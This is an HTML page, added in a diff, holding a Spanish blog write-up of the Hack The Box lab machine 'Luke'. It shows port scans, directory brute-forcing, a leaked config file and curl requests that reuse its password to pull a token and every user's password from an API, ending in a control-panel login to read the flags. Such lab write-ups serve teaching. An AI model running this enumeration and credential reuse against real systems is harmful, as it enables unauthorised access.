@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/static/img/favicon.ico" />
+    <title>Luke - Hack The Box - Roskyfrosky Blog</title>
+    <meta name="author" content="Roskyfrosky" />
+    <meta name="description" content="Luke - Hack The Box" />
+    <meta name="keywords" content="Luke - Hack The Box, Roskyfrosky Blog, hackthebox" />
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml">
+    <meta content="" property="fb:app_id">
+    <meta content="Roskyfrosky Blog" property="og:site_name">
+
+    
+
+    
+      <meta content="Luke - Hack The Box" property="og:title">
+      <meta content="article" property="og:type">
+    
+
+    
+      <meta content="This is my personal blog" property="og:description">
+    
+
+    
+      <meta content="https://blog.roskyfrosky.com/hackthebox/2019/09/14/Luke-hackthebox.html" property="og:url">
+    
+
+    
+      <meta content="2019-09-14T13:11:34+02:00" property="article:published_time">
+      <meta content="https://blog.roskyfrosky.com/about/" property="article:author">
+    
+
+    
+      <meta content="https://blog.roskyfrosky.com/static/img/posts//images/avatares/Luke.png" property="og:image">
+    
+
+    
+      
+        <meta content="hackthebox" property="article:section">
+      
+    
+
+    
+      
+        <meta content="hackthebox" property="article:tag">
+      
+    
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@roskyfrosky">
+    <meta name="twitter:creator" content="@roskyfrosky">
+
+    
+      <meta name="twitter:title" content="Luke - Hack The Box">
+    
+
+    
+      <meta name="twitter:url" content="https://blog.roskyfrosky.com/hackthebox/2019/09/14/Luke-hackthebox.html">
+    
+
+    
+      <meta name="twitter:description" content="This is my personal blog">
+    
+
+    
+
+    <!-- Font awesome icons -->
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">
+    <!-- syntax highlighting CSS -->
+    <link rel="stylesheet" href="/static/css/syntax.css">
+    <!-- Bootstrap core CSS -->
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300italic,300,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/static/css/super-search.css">
+    <link rel="stylesheet" href="/static/css/thickbox.css">
+    <link rel="stylesheet" href="/static/css/projects.css">
+    <link rel="stylesheet" href="/static/css/main.css">
+
+    
+  </head>
+  <body>
+    <div class="container">
+      <div class="col-sm-3">
+        <div class="fixed-condition">
+          <a href="/"><img class="profile-avatar" src="/static/img/avatar.jpg" height="75px" width="75px" /></a>
+          <h1 class="author-name">Roskyfrosky</h1>
+          
+          <div class="social">
+            <ul>
+              
+                <li><a href="https://twitter.com/roskyfrosky" target="_blank"><i class="fa fa-twitter"></i></a></li>
+              
+                <li><a href="https://github.com/roskyfrosky" target="_blank"><i class="fa fa-github"></i></a></li>
+              
+            </ul>
+          </div>
+          <div class="search" id="js-search">
+            <input type="text" placeholder="(sitemap)~$ type to search" class="search__input form-control" id="js-search__input">
+            <ul class="search__results" id="js-search__results"></ul>
+          </div>
+          <hr />
+          <ul class="sidebar-nav">
+            <strong>Navigation</strong>
+            <li><a href="/">Home</a></li>
+            
+              <li><a class="about" href="/about/">About Me</a></li>
+            
+              <li><a class="about" href="/feed.xml">XML Feed</a></li>
+            
+          </ul>
+        </div>
+        <!-- end /.fixed-condition -->
+      </div>
+      <div class="col-sm-8 col-offset-1 main-layout">
+        <header class="post-header">
+  <h1 class="post-title">Luke - Hack The Box</h1>
+</header>
+
+<span class="time">14 Sep 2019</span>
+
+  <span class="categories">
+    &raquo; <a href="/category/hackthebox">hackthebox</a>
+  </span>
+
+
+<div class="content">
+  <div class="post"><p><img src="/images/avatares/Luke.png" alt="" class="align-center" /></p>
+
+<h2 id="-resumen-">[ Resumen ]</h2>
+
+<p>Hoy os traigo el writeup de como resolver la máquina Luke de Hackthebox. Como podéis ver la dificultad de la máquina es Media aunque yo la habría clasificado como fácil ya que consiste en distintos pasos de enumeración sobre distintos servicios y en el uso de los datos que obtienes trás esa enumeración</p>
+
+<h2 id="-00--recon">[ 00 – Recon]</h2>
+
+<p>En primer lugar, como siempre, realizamos un escaneo de puertos rápido con masscan para saber que servicios, tanto udp como tcp, hay abiertos en la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Luke#masscan <span class="nt">-p1-65535</span>,U:1-65535  10.10.10.137 <span class="nt">--rate</span><span class="o">=</span>1000 <span class="nt">-e</span> tun0
+
+Starting masscan 1.0.6 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2019-08-27 08:20:08 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 3000/tcp on 10.10.10.137
+Discovered open port 21/tcp on 10.10.10.137
+Discovered open port 80/tcp on 10.10.10.137
+Discovered open port 8000/tcp on 10.10.10.137
+Discovered open port 22/tcp on 10.10.10.137
+</code></pre></div></div>
+
+<p>Una vez que tenemos los puertos que hay abiertos, realizamos un escaneo con nmap sobre esos puertos para saber que servicio y las versiones de los mismos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Luke#nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> Luke luke.htb <span class="nt">-p21</span>,22,80,3000,8000
+
+Starting Nmap 7.40 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-08-27 09:57 CEST
+Nmap scan report <span class="k">for </span>luke.htb <span class="o">(</span>10.10.10.137<span class="o">)</span>
+Host is up <span class="o">(</span>0.081s latency<span class="o">)</span><span class="nb">.</span>
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ <span class="o">(</span>ext.1<span class="o">)</span>
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+22/tcp   open  ssh?
+80/tcp   open  http    Apache httpd 2.4.38 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.3.3<span class="o">)</span>
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn<span class="s1">'t have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 161.53 seconds
+</span></code></pre></div></div>
+
+<p>En el resultado de Nmap, vemos que está permitido el acceso como anonymous al ftp.</p>
+
+<p>Entramos y vemos un fichero con nombre “for_Chihiro.txt” cuyo contenido es el siguiente:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies !
+
+Derry
+</code></pre></div></div>
+
+<p>Tras leer la nota del ftp, llegamos a la conclusion de que tenemos que encontrar un backup de la web en alguno de los otros puertos que hemos visto que estan abiertos.
+Para ello, lanzamos el gobuster con distintas extensiones sobre el puerto 80.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Luke#gobuster  <span class="nt">-u</span> http://luke.htb <span class="nt">-w</span>  /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt <span class="nt">-x</span> php,html,txt,zip,rar,bak <span class="nt">-t</span> 100
+
+<span class="o">=====================================================</span>
+Gobuster v2.0.1              OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span>
+<span class="o">=====================================================</span>
+<span class="o">[</span>+] Mode         : dir
+<span class="o">[</span>+] Url/Domain   : http://luke.htb/
+<span class="o">[</span>+] Threads      : 100
+<span class="o">[</span>+] Wordlist     : /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes : 200,204,301,302,307,403
+<span class="o">[</span>+] Extensions   : txt,zip,rar,bak,php,html
+<span class="o">[</span>+] Timeout      : 10s
+<span class="o">=====================================================</span>
+2019/08/27 10:05:15 Starting gobuster
+<span class="o">=====================================================</span>
+/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+/login.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/member <span class="o">(</span>Status: 301<span class="o">)</span>
+/css <span class="o">(</span>Status: 301<span class="o">)</span>
+/js <span class="o">(</span>Status: 301<span class="o">)</span>
+/vendor <span class="o">(</span>Status: 301<span class="o">)</span>
+/config.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/LICENSE <span class="o">(</span>Status: 200<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Accediendo a los distintos ficheros que hemos obtenido con el gobuster, encontramos que al visitar el fichero config.php obtenemos el codigo fuente del fichero:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span> <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span> <span class="nv">$dbPassword</span> <span class="o">=</span> <span class="s1">'Zk6heYCyv6ZE9Xcg'</span><span class="p">;</span> <span class="nv">$db</span> <span class="o">=</span> <span class="s2">"login"</span><span class="p">;</span> <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span> <span class="nv">$dbUsername</span><span class="p">,</span> <span class="nv">$dbPassword</span><span class="p">,</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Connect failed: %s</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span> <span class="nv">$conn</span> <span class="o">-&gt;</span> <span class="na">error</span><span class="p">);</span> 
+</code></pre></div></div>
+
+<p>Ahora accemos el mismo proceso pero lanzando el gobuster para el servicio que se encuentra en el puerto 3000</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Luke#gobuster  <span class="nt">-u</span> http://luke.htb:3000 <span class="nt">-w</span>  /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt <span class="nt">-x</span> php,html,txt,zip,rar,bak <span class="nt">-t</span> 100
+
+<span class="o">=====================================================</span>
+Gobuster v2.0.1              OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span>
+<span class="o">=====================================================</span>
+<span class="o">[</span>+] Mode         : dir
+<span class="o">[</span>+] Url/Domain   : http://luke.htb:3000/
+<span class="o">[</span>+] Threads      : 100
+<span class="o">[</span>+] Wordlist     : /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes : 200,204,301,302,307,403
+<span class="o">[</span>+] Extensions   : php,html,txt,zip,rar,bak
+<span class="o">[</span>+] Timeout      : 10s
+<span class="o">=====================================================</span>
+2019/08/27 10:07:38 Starting gobuster
+<span class="o">=====================================================</span>
+/login <span class="o">(</span>Status: 200<span class="o">)</span>
+/users <span class="o">(</span>Status: 200<span class="o">)</span>
+/Login <span class="o">(</span>Status: 200<span class="o">)</span>
+/Users <span class="o">(</span>Status: 200<span class="o">)</span>
+</code></pre></div></div>
+
+<p>En el puerto 8000 vemos que hay un login directamente nada más acceder a través del navegador.</p>
+
+<h2 id="-01--getting-access">[ 01 – Getting Access]</h2>
+
+<p>Probando las credenciales que hemos obtenido del fichero config.php, vemos que son válidas para la API que se encuentra en el puerto 3000.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Luke#curl <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-X</span> POST http://luke.htb:3000/login <span class="nt">-d</span> <span class="s2">"{</span><span class="se">\"</span><span class="s2">username</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">admin</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">Zk6heYCyv6ZE9Xcg</span><span class="se">\"</span><span class="s2">}"</span>
+
+
+Respuesta:
+
+<span class="o">{</span><span class="s2">"success"</span>:true,<span class="s2">"message"</span>:<span class="s2">"Authentication successful!"</span>,<span class="s2">"token"</span>:<span class="s2">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzkwNTgxLCJleHAiOjE1NTk0NzY5ODF9.eSCG6iP3DMorQ9RpQ799-wJ1_9n00ikV3ISEryhsi_g"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Ahora que hemos podido acceder, vamos a listar los usuarios</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Luke#curl  <span class="nt">-H</span> <span class="s2">"Accept: application/json"</span> <span class="nt">-X</span> GET http://luke.htb:3000/users <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzkwNTgxLCJleHAiOjE1NTk0NzY5ODF9.eSCG6iP3DMorQ9RpQ799-wJ1_9n00ikV3ISEryhsi_g"</span>
+
+Respuesta:
+<span class="o">[{</span><span class="s2">"ID"</span>:<span class="s2">"1"</span>,<span class="s2">"name"</span>:<span class="s2">"Admin"</span>,<span class="s2">"Role"</span>:<span class="s2">"Superuser"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"2"</span>,<span class="s2">"name"</span>:<span class="s2">"Derry"</span>,<span class="s2">"Role"</span>:<span class="s2">"Web Admin"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"3"</span>,<span class="s2">"name"</span>:<span class="s2">"Yuri"</span>,<span class="s2">"Role"</span>:<span class="s2">"Beta Tester"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"4"</span>,<span class="s2">"name"</span>:<span class="s2">"Dory"</span>,<span class="s2">"Role"</span>:<span class="s2">"Supporter"</span><span class="o">}]</span>
+
+</code></pre></div></div>
+
+<h2 id="-02--priv-esc">[ 02 – Priv. Esc.]</h2>
+
+<p>Hemos podido obtener distintos usuarios, entre ellos el usuario Admin con rol de superusuario. Lo que haremos a continuación, será obtener toda la información de cada usuario. Para ello realizamos una petición por cada usuario en la cuál obtendremos su contraseña</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@kali:~/HTB/Luke#curl  <span class="nt">-H</span> <span class="s2">"Accept: application/json"</span> <span class="nt">-X</span> GET  http://luke.htb:3000/users/admin <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzkwNTgxLCJleHAiOjE1NTk0NzY5ODF9.eSCG6iP3DMorQ9RpQ799-wJ1_9n00ikV3ISEryhsi_g"</span>
+
+
+Respuesta:
+
+<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"Admin"</span>,<span class="s2">"password"</span>:<span class="s2">"WX5b7)&gt;/rp</span><span class="nv">$U</span><span class="s2">)FW"</span><span class="o">}</span>
+
+
+</code></pre></div></div>
+
+<p>Haciendo lo mismo para el resto de usuarios, obtenemos también sus contraseñas</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+{name":"Derry","password":"rZ86wwLvx7jUxtch"}
+{"name":"Yuri","password":"bet@tester87"}
+{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+
+</code></pre></div></div>
+
+<p>Ahora que tenemos varios  usuarios, vamos a probarlos en las distintas páginas de login que tenemos identificadas, para ver si alguno de ellos es válido.
+Vemos que el usuario Derry funciona en el Basic Authentication que existe en el puerto 80, cuando intentamos acceder a la carpeta management.
+Al entrar, vemos que hay distintos ficheros config, con distintas extensiones. El fichero config.php es el mismo que habíamos obtenido anteriormente, pero ahora hay un fichero config.json en el que obtenemos una nueva credencial para el usuario root.</p>
+
+<p><img src="/images/Hackthebox/Luke/management.png" alt="" class="img-responsive" /></p>
+
+<p>Accedemos al purto 8000 tal y como indica el fichero de configuración e introducimos las credenciales <code class="highlighter-rouge">root:KpMasng6S5EtTy9Z</code></p>
+
+<p><img src="/images/Hackthebox/Luke/dashboard.png" alt="" class="img-responsive" /></p>
+
+<p>Una vez dentro del dashboard principal, para ganar tanto la flag de user como  la de root, solo hay que ir al filemanager y buscar ambos ficheros.</p>
+
+<p><img src="/images/Hackthebox/Luke/user.png" alt="" class="img-responsive" /></p>
+
+<p><img src="/images/Hackthebox/Luke/root.png" alt="" class="img-responsive" /></p>
+
+</div>
+  <div class="share-page">
+  <span style="float: left;">Share this on &rarr;&nbsp;&nbsp;</span>
+
+  <!-- Twitter -->
+  <a href="https://twitter.com/share" class="twitter-share-button" data-via="roskyfrosky">Tweet</a>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+  <!-- Google + -->
+  <div class="g-plus" data-action="share" data-annotation="bubble"></div>
+  <script src="https://apis.google.com/js/platform.js" async defer></script>
+
+  <!-- Facebook -->
+  <div class="fb-share-button" data-href="https://blog.roskyfrosky.com/hackthebox/2019/09/14/Luke-hackthebox.html" data-layout="button_count" style="position: relative; top: -8px; left: 3px;"></div>
+</div>
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+</div>
+
+
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+            
+            <div class="panel-body">
+              <h4>Related Posts</h4>
+              <ul>
+            
+                <li class="relatedPost">
+                  <a href="https://blog.roskyfrosky.com/hackthebox/2019/09/07/Bastion-hackthebox.html">Bastion - Hack The Box</a>
+                  
+                    (Categories: <a href="/category/hackthebox">hackthebox</a>)
+                  
+                </li>
+          
+          
+        
+      
+    
+  
+    
+      
+        
+          
+            
+                <li class="relatedPost">
+                  <a href="https://blog.roskyfrosky.com/hackthebox/2018/11/20/Jerry-hackthebox.html">Jerry - Hack The Box</a>
+                  
+                    (Categories: <a href="/category/hackthebox">hackthebox</a>)
+                  
+                </li>
+          
+          
+        
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+  
+  </ul>
+</div>
+
+
+<div class="PageNavigation">
+  
+    <a class="prev" href="/hackthebox/2019/09/07/Bastion-hackthebox.html">&laquo; Bastion - Hack The Box</a>
+  
+  
+</div>
+
+
+<div id="disqus_thread"></div>
+<script>
+
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://roskyfrosky-github-io.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+        <footer>
+          &copy; Roskyfrosky
+          
+            - <a href="https://github.com/roskyfrosky">https://github.com/roskyfrosky</a> - Powered by Jekyll.
+          
+        </footer>
+      </div>
+      <!-- end /.col-sm-8 -->
+    </div>
+    <!-- end /.container -->
+
+    <!-- Bootstrap core JavaScript -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+    <script src="/static/js/bootstrap.min.js"></script>
+    <script src="/static/js/super-search.js"></script>
+    <script src="/static/js/thickbox-compressed.js"></script>
+    <script src="/static/js/projects.js"></script>
+  </body>
+</html>
+
